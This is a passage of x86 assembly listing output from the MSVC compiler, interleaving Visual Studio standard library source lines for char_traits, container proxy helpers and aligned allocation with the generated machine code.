; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00003	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 0c	 mov	 ecx, DWORD PTR __First2$[ebp]
  0000a	51		 push	 ecx
  0000b	8b 55 08	 mov	 edx, DWORD PTR __First1$[ebp]
  0000e	52		 push	 edx
  0000f	e8 00 00 00 00	 call	 _memmove
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00017	8b 45 08	 mov	 eax, DWORD PTR __First1$[ebp]

; 121  :     }

  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ENDP	; std::_Char_traits<char,int>::move
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z
_TEXT	SEGMENT
__First1$ = 8						; size = 4
__First2$ = 12						; size = 4
__Count$ = 16						; size = 4
?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z PROC	; std::_Char_traits<char,int>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00003	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 0c	 mov	 ecx, DWORD PTR __First2$[ebp]
  0000a	51		 push	 ecx
  0000b	8b 55 08	 mov	 edx, DWORD PTR __First1$[ebp]
  0000e	52		 push	 edx
  0000f	e8 00 00 00 00	 call	 _memcpy
  00014	83 c4 0c	 add	 esp, 12			; 0000000cH

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00017	8b 45 08	 mov	 eax, DWORD PTR __First1$[ebp]

; 68   :     }

  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ENDP	; std::_Char_traits<char,int>::copy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00009	66 8b 11	 mov	 dx, WORD PTR [ecx]
  0000c	66 89 10	 mov	 WORD PTR [eax], dx

; 301  :     }

  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Count$ = 12						; size = 4
__Ch$ = 16						; size = 2
?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 283  :         _Out_writes_all_(_Count) _Elem* const _First, size_t _Count, const _Elem _Ch) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 284  :         // assign _Count * _Ch to [_First, ...)
; 285  : #if _HAS_CXX20
; 286  :         if (_STD is_constant_evaluated()) {
; 287  :             return _Primary_char_traits::assign(_First, _Count, _Ch);
; 288  :         }
; 289  : #endif // _HAS_CXX20
; 290  : 
; 291  :         return reinterpret_cast<_Elem*>(_CSTD wmemset(reinterpret_cast<wchar_t*>(_First), _Ch, _Count));

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	50		 push	 eax
  00007	0f b7 4d 10	 movzx	 ecx, WORD PTR __Ch$[ebp]
  0000b	51		 push	 ecx
  0000c	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0000f	52		 push	 edx
  00010	e8 00 00 00 00	 call	 _wmemset
  00015	83 c4 0c	 add	 esp, 12			; 0000000cH

; 292  :     }

  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SAIPB_W@Z
_TEXT	SEGMENT
tv66 = -16						; size = 4
tv71 = -12						; size = 4
tv68 = -8						; size = 4
tv74 = -2						; size = 2
__First$ = 8						; size = 4
?length@?$_WChar_traits@_W@std@@SAIPB_W@Z PROC		; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);

  00006	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00009	89 45 f8	 mov	 DWORD PTR tv68[ebp], eax
  0000c	8b 4d f8	 mov	 ecx, DWORD PTR tv68[ebp]
  0000f	83 c1 02	 add	 ecx, 2
  00012	89 4d f4	 mov	 DWORD PTR tv71[ebp], ecx
$LL3@length:
  00015	8b 55 f8	 mov	 edx, DWORD PTR tv68[ebp]
  00018	66 8b 02	 mov	 ax, WORD PTR [edx]
  0001b	66 89 45 fe	 mov	 WORD PTR tv74[ebp], ax
  0001f	83 45 f8 02	 add	 DWORD PTR tv68[ebp], 2
  00023	66 83 7d fe 00	 cmp	 WORD PTR tv74[ebp], 0
  00028	75 eb		 jne	 SHORT $LL3@length
  0002a	8b 4d f8	 mov	 ecx, DWORD PTR tv68[ebp]
  0002d	2b 4d f4	 sub	 ecx, DWORD PTR tv71[ebp]
  00030	d1 f9		 sar	 ecx, 1
  00032	89 4d f0	 mov	 DWORD PTR tv66[ebp], ecx
  00035	8b 45 f0	 mov	 eax, DWORD PTR tv66[ebp]

; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));
; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  00038	8b e5		 mov	 esp, ebp
  0003a	5d		 pop	 ebp
  0003b	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SAIPB_W@Z ENDP		; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?compare@?$_WChar_traits@_W@std@@SAHQB_W0I@Z
_TEXT	SEGMENT
tv68 = -20						; size = 4
tv66 = -16						; size = 4
tv67 = -12						; size = 4
tv65 = -8						; size = 4
tv71 = -4						; size = 2
tv70 = -2						; size = 2
__First1$ = 8						; size = 4
__First2$ = 12						; size = 4
__Count$ = 16						; size = 4
?compare@?$_WChar_traits@_W@std@@SAHQB_W0I@Z PROC	; std::_WChar_traits<wchar_t>::compare, COMDAT

; 241  :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H

; 242  :         // compare [_First1, _First1 + _Count) with [_First2, ...)
; 243  : #if _HAS_CXX17
; 244  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 245  :             return __builtin_wmemcmp(_First1, _First2, _Count);

  00006	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp]
  00009	89 45 f8	 mov	 DWORD PTR tv65[ebp], eax
  0000c	8b 4d 0c	 mov	 ecx, DWORD PTR __First2$[ebp]
  0000f	89 4d f0	 mov	 DWORD PTR tv66[ebp], ecx
  00012	8b 55 08	 mov	 edx, DWORD PTR __First1$[ebp]
  00015	89 55 f4	 mov	 DWORD PTR tv67[ebp], edx
  00018	c7 45 ec 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@compare:
  0001f	83 7d f8 00	 cmp	 DWORD PTR tv65[ebp], 0
  00023	76 46		 jbe	 SHORT $LN3@compare
  00025	8b 45 f4	 mov	 eax, DWORD PTR tv67[ebp]
  00028	66 8b 08	 mov	 cx, WORD PTR [eax]
  0002b	66 89 4d fe	 mov	 WORD PTR tv70[ebp], cx
  0002f	8b 55 f0	 mov	 edx, DWORD PTR tv66[ebp]
  00032	66 8b 02	 mov	 ax, WORD PTR [edx]
  00035	66 89 45 fc	 mov	 WORD PTR tv71[ebp], ax
  00039	66 8b 4d fe	 mov	 cx, WORD PTR tv70[ebp]
  0003d	66 3b 4d fc	 cmp	 cx, WORD PTR tv71[ebp]
  00041	75 0e		 jne	 SHORT $LN5@compare
  00043	83 6d f8 01	 sub	 DWORD PTR tv65[ebp], 1
  00047	83 45 f4 02	 add	 DWORD PTR tv67[ebp], 2
  0004b	83 45 f0 02	 add	 DWORD PTR tv66[ebp], 2
  0004f	eb ce		 jmp	 SHORT $LN4@compare
$LN5@compare:
  00051	66 8b 55 fe	 mov	 dx, WORD PTR tv70[ebp]
  00055	66 3b 55 fc	 cmp	 dx, WORD PTR tv71[ebp]
  00059	73 09		 jae	 SHORT $LN6@compare
  0005b	c7 45 ec ff ff
	ff ff		 mov	 DWORD PTR tv68[ebp], -1
  00062	eb 07		 jmp	 SHORT $LN3@compare
$LN6@compare:
  00064	c7 45 ec 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
$LN3@compare:
  0006b	8b 45 ec	 mov	 eax, DWORD PTR tv68[ebp]

; 246  :         } else {
; 247  :             return _Primary_char_traits::compare(_First1, _First2, _Count);
; 248  :         }
; 249  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 250  :         return _CSTD wmemcmp(
; 251  :             reinterpret_cast<const wchar_t*>(_First1), reinterpret_cast<const wchar_t*>(_First2), _Count);
; 252  : #endif // ^^^ !_HAS_CXX17 ^^^
; 253  :     }

  0006e	8b e5		 mov	 esp, ebp
  00070	5d		 pop	 ebp
  00071	c3		 ret	 0
?compare@?$_WChar_traits@_W@std@@SAHQB_W0I@Z ENDP	; std::_WChar_traits<wchar_t>::compare
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z
_TEXT	SEGMENT
__First1$ = 8						; size = 4
__First2$ = 12						; size = 4
__Count$ = 16						; size = 4
?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z PROC	; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00003	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	d1 e0		 shl	 eax, 1
  00008	50		 push	 eax
  00009	8b 4d 0c	 mov	 ecx, DWORD PTR __First2$[ebp]
  0000c	51		 push	 ecx
  0000d	8b 55 08	 mov	 edx, DWORD PTR __First1$[ebp]
  00010	52		 push	 edx
  00011	e8 00 00 00 00	 call	 _memmove
  00016	83 c4 0c	 add	 esp, 12			; 0000000cH

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00019	8b 45 08	 mov	 eax, DWORD PTR __First1$[ebp]

; 121  :     }

  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ENDP	; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z
_TEXT	SEGMENT
__First1$ = 8						; size = 4
__First2$ = 12						; size = 4
__Count$ = 16						; size = 4
?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z PROC	; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00003	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	d1 e0		 shl	 eax, 1
  00008	50		 push	 eax
  00009	8b 4d 0c	 mov	 ecx, DWORD PTR __First2$[ebp]
  0000c	51		 push	 ecx
  0000d	8b 55 08	 mov	 edx, DWORD PTR __First1$[ebp]
  00010	52		 push	 edx
  00011	e8 00 00 00 00	 call	 _memcpy
  00016	83 c4 0c	 add	 esp, 12			; 0000000cH

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00019	8b 45 08	 mov	 eax, DWORD PTR __First1$[ebp]

; 68   :     }

  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ENDP	; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ PROC		; std::_Fake_proxy_ptr_impl::_Release, COMDAT
; _this$ = ecx

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ENDP		; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
___formal$ = 12						; size = 4
??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT
; _this$ = ecx

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c2 08 00	 ret	 8
??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT
; _this$ = ecx

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c2 04 00	 ret	 4
?_Alloc_proxy@_Container_base0@std@@QAEXABU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z PROC ; std::_Container_base0::_Swap_proxy_and_iterators, COMDAT
; _this$ = ecx

; 1177 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(_Container_base0&) noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c2 04 00	 ret	 4
?_Swap_proxy_and_iterators@_Container_base0@std@@QAEXAAU12@@Z ENDP ; std::_Container_base0::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Orphan_all@_Container_base0@std@@QAEXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT
; _this$ = ecx

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
?_Orphan_all@_Container_base0@std@@QAEXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z
_TEXT	SEGMENT
__Min_back_shift$ = -16					; size = 4
__Ptr_user$ = -12					; size = 4
__Ptr_container$ = -8					; size = 4
__Back_shift$ = -4					; size = 4
__Ptr$ = 8						; size = 4
__Bytes$ = 12						; size = 4
?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00006	8b 45 0c	 mov	 eax, DWORD PTR __Bytes$[ebp]
  00009	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000b	83 c1 23	 add	 ecx, 35			; 00000023H
  0000e	8b 55 0c	 mov	 edx, DWORD PTR __Bytes$[ebp]
  00011	89 0a		 mov	 DWORD PTR [edx], ecx

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

  00013	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00016	8b 08		 mov	 ecx, DWORD PTR [eax]
  00018	89 4d f4	 mov	 DWORD PTR __Ptr_user$[ebp], ecx

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0001b	ba 04 00 00 00	 mov	 edx, 4
  00020	6b c2 ff	 imul	 eax, edx, -1
  00023	8b 4d f4	 mov	 ecx, DWORD PTR __Ptr_user$[ebp]
  00026	8b 14 01	 mov	 edx, DWORD PTR [ecx+eax]
  00029	89 55 f8	 mov	 DWORD PTR __Ptr_container$[ebp], edx

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

  0002c	c7 45 f0 04 00
	00 00		 mov	 DWORD PTR __Min_back_shift$[ebp], 4

; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00033	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]
  00036	8b 08		 mov	 ecx, DWORD PTR [eax]
  00038	2b 4d f8	 sub	 ecx, DWORD PTR __Ptr_container$[ebp]
  0003b	89 4d fc	 mov	 DWORD PTR __Back_shift$[ebp], ecx
$LN4@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0003e	83 7d fc 04	 cmp	 DWORD PTR __Back_shift$[ebp], 4
  00042	72 08		 jb	 SHORT $LN8@Adjust_man
  00044	83 7d fc 23	 cmp	 DWORD PTR __Back_shift$[ebp], 35 ; 00000023H
  00048	77 02		 ja	 SHORT $LN8@Adjust_man
  0004a	eb 09		 jmp	 SHORT $LN6@Adjust_man
$LN8@Adjust_man:
  0004c	e8 00 00 00 00	 call	 __invalid_parameter_noinfo_noreturn
  00051	33 d2		 xor	 edx, edx
  00053	75 f7		 jne	 SHORT $LN8@Adjust_man
$LN6@Adjust_man:
  00055	33 c0		 xor	 eax, eax
  00057	75 e5		 jne	 SHORT $LN4@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00059	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  0005c	8b 55 f8	 mov	 edx, DWORD PTR __Ptr_container$[ebp]
  0005f	89 11		 mov	 DWORD PTR [ecx], edx
$LN1@Adjust_man:

; 179  : }

  00061	8b e5		 mov	 esp, ebp
  00063	5d		 pop	 ebp
  00064	c3		 ret	 0
?_Adjust_manually_vector_aligned@std@@YAXAAPAXAAI@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z
_TEXT	SEGMENT
__Bytes$ = 8						; size = 4
?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z PROC	; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 90   :         return ::operator new(_Bytes);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Bytes$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0000c	83 c4 04	 add	 esp, 4

; 91   :     }

  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPAXI@Z ENDP	; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = -12						; size = 12
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 64   :     _THROW(bad_array_new_length{});

  00006	8d 4d f4	 lea	 ecx, DWORD PTR $T1[ebp]
